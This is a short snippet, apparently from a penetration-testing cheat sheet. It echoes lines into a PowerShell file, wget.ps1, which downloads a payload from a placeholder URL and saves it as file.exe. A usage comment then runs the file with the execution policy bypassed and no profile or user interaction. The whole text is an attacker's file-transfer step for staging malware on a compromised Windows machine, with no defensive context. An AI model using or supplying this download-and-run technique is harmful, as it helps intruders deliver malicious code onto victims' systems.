echo $storeageDir = $pwn > wget.ps1
echo $webclient = New-Object System.Net.Webclient >> wget.ps1
echo $url = "location of payload" >> wget.ps1
echo $file = "file.exe" >> wget.ps1
echo $webclient.Downloadfile($url,$file) >> wget.ps1

#Useage = powershell.exe -ExecutionPolicy Bypass -Nologo -Noninteractive -NoProfile -File wget.ps1
